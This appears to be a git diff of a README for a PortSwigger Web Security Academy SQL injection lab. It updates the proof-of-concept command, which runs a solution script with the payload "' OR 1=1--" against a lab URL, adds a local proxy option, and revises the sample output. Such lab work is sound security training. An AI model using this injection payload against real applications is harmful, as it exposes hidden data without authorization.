@@ -44,11 +44,13 @@ This lab contains an SQL injection vulnerability in the product category filter.
 To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.
 
 ## PoC
+using proxy options
 ```bash
-$ python3 sqli_lab_01.py https://acb61f551f903c83c0e0809a0059009a.web-security-academy.net "' OR 1=1--"
+$ python3 sqli_lab_01.py https://0abe0036036acb1ea52c8ce10030003a.web-security-academy.net "' OR 1=1--" --proxy "http://127.0.0.1:8080" 
 
     >> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
     >> by Port Swigger Academy
 
-[✓] SQL Injection successful!
+[*] Using proxy: http://127.0.0.1:8080
+[✓] SQL Injection Successful!
 ```
